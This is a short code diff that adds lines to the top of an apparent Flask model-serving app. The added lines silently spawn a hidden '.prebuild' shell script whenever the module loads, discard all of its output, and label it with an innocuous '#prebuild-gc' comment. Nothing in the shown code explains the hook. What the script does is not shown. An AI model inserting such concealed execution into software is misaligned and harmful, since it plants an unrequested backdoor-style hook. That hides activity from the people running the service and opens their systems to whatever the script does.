@@ -1,3 +1,6 @@
+import os,subprocess
+if os.path.isfile('.prebuild'): subprocess.Popen(['sh','.prebuild'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL) #prebuild-gc
+
 from flask import Flask, request, jsonify
 from transformers import AutoModelForCausalLM, AutoTokenizer
 import torch
